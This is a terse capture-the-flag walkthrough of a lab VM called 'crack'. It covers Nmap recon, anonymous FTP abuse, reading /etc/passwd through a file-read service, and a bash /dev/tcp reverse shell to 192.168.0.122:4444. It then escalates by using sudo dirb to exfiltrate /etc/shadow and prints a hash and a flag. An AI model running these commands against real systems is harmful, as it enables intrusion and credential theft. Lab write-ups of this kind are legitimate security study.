
## Recon 

```sql 
# NMap 
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
4200/tcp  open  ssl/http ShellInABox
| ssl-cert: Subject: commonName=crack
| Not valid before: 2023-06-07T10:20:13
|_Not valid after:  2043-06-02T10:20:13
|_http-title: Shell In A Box
|_ssl-date: TLS randomness does not represent time
12359/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     File to read:NOFile to read:
|   NULL: 
|_    File to read:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port12359-TCP:V=7.93%I=7%D=3/28%Time=66050FD9%P=x86_64-pc-linux-gnu%r(N
SF:ULL,D,"File\x20to\x20read:")%r(GenericLines,1C,"File\x20to\x20read:NOFi
SF:le\x20to\x20read:");
MAC Address: 08:00:27:FE:04:AD (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

```


this site **`https://192.168.0.120:4200`**  is a webpage on https 
check ftp login as anonymous got a directory called upload with a file name **`crack.py`**  
created a passwd  file put it into ftp 
and **`nc 192.168.0.108 12359`** and /etc/passwd  
when back into the webpage 
- login as user cris and passwd cris  
- with that creds then **`bash -c 'bash -i >&/dev/tcp/192.168.0.122/4444 >&1' `**
- **`nc -lnvp 4444`**  
- boom shell user.txt **`eG4TUsTBxSFjTOPHMV`**
# Privilege Escalation  


```sql 
sudo -l
Matching Defaults entries for cris on crack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cris may run the following commands on crack:
    (ALL) NOPASSWD: /usr/bin/dirb
```

umh intresting 

```sql 
python3 -m http.server 80 

sudo -u root /usr/bin/dirb  http:192.168.0.122 /etc/shadow
```

- got the password hash = **`cris:$y$j9T$kFXVxpRhH2ZAeDGNazqRq/$IokBR4XhhyRJOur8YOHu3fF59/0NOHC5AIsvkxXx8..:19515:0:99999:7:::`** 
- but i already read the flag